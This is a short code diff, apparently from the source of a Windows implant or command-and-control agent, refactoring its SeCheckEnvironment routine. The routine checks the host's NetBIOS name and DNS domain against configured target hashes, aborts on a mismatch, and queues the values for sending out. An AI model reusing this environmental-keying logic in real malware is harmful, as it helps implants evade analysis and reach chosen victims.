@@ -1,7 +1,7 @@
 #include <core/include/opsec.hpp>
 using namespace Utils;
-using namespace Stream;
 using namespace Random;
+using namespace Stream;
 using namespace Message;
 using namespace Commands;
 
@@ -84,8 +84,7 @@ VOID SeCheckEnvironment() {
         buffer = (PCHAR) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length);
 
         if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, buffer, &length)) {
-
-            if (GetHashFromStringA(Ctx->Config.Hostname, x_strlen(Ctx->Config.Hostname)) != GetHashFromStringA(buffer, x_strlen(buffer))) {
+            if (GetHashFromString(Ctx->Config.Hostname, x_strlen(Ctx->Config.Hostname)) != GetHashFromString(buffer, x_strlen(buffer))) {
                 return_defer(ERROR_BAD_ENVIRONMENT);
             }
             PackString(Outbound, buffer);
@@ -103,8 +102,7 @@ VOID SeCheckEnvironment() {
             buffer = (PCHAR) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length);
 
             if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, buffer, &length)) {
-
-                if (GetHashFromStringA(Ctx->Config.Domain, x_strlen(Ctx->Config.Domain)) != GetHashFromStringA(buffer, x_strlen(buffer))) {
+                if (GetHashFromString(Ctx->Config.Domain, x_strlen(Ctx->Config.Domain)) != GetHashFromString(buffer, x_strlen(buffer))) {
                     return_defer(ERROR_BAD_ENVIRONMENT);
                 }
                 PackString(Outbound, buffer);
@@ -147,7 +145,6 @@ VOID SeCheckEnvironment() {
     OutboundQueue(Outbound);
 
     defer:
-    return;
 }
 
 VOID SeImageCheck(PIMAGE img, PIMAGE proc) {
